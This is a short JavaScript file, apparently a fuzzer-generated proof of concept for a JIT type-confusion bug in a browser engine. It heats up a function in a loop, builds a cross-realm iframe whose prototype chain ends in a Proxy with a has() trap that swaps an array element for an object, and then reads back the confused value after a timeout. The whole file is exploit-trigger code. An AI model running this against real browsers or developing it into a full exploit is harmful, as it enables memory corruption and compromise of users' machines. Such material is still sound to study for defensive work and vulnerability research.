function opt(a1, a2) {
    a1[1] = 1.1;
    let tmp = 0 in a2;
    a1[0] = 2.3023e-320;
    return tmp;
}
function main() {
    let v11;
    try {
        v11 = document.createElement("iframe");
    } catch(e14) {
    }
    const v12 = document?.body;
    let v13;
    try {
        v13 = v12.appendChild(v11);
    } catch(e21) {
    }
    let o = v13?.contentWindow;
    const v16 = `\nlet p = new Proxy({}, {});\nlet a = {__proto__: {}};\na.__proto__.__proto__ = p;\n`;
    try {
        o.eval(v16);
    } catch(e27) {
    }
    let arr = [1.1,2.2];
    let arr2 = [1.1,2.2];
    const v26 = o?.Object;
    let v27;
    try {
        const v40 = new v26();
        v27 = v40;
    } catch(e41) {
    }
    let proto = v27;
    let handler = {};
    arr2.__proto__ = proto;
    const v32 = {};
    const v50 = {
        has() {
            arr[0] = {};
            return true;
        },
    };
    const v36 = v50;
    let v37;
    try {
        const v55 = new Proxy(v32, v36);
        v37 = v55;
    } catch(e56) {
    }
    proto.__proto__ = v37;
    for (let i58 = 0; i58 < 10000; i58++) {
        try {
            opt(arr, arr2);
        } catch(e65) {
        }
    }
    const v66 = () => {
        delete arr2?.[0];
        try {
            opt(arr, arr2);
        } catch(e70) {
        }
        const v50 = arr?.[0];
        try {
            console.log(v50);
        } catch(e75) {
        }
    };
    const v46 = v66;
    try {
        setTimeout(v46, 500);
    } catch(e80) {
    }
}
try {
    main();
} catch(e82) {
}
